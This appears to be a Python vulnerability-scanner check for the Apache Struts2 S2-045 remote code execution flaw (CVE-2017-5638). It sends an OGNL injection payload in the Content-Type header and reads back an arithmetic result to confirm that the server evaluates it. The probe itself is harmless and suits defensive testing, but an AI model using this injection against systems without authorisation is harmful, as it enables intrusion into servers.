import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）',
        'vulnerable': False
    }
    try:
        headers_payload = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': r'''"%{# context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('abcd',4321*1234)}.multipart/form-data"'''
        }
        req = requests.post(url, headers=headers_payload, timeout=3)
        if req.headers['abcd'] == '5332114':
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = url
            relsult['position'] = 'Content-Type'
            relsult['payload'] = headers_payload
        return relsult
    except:
        return relsult



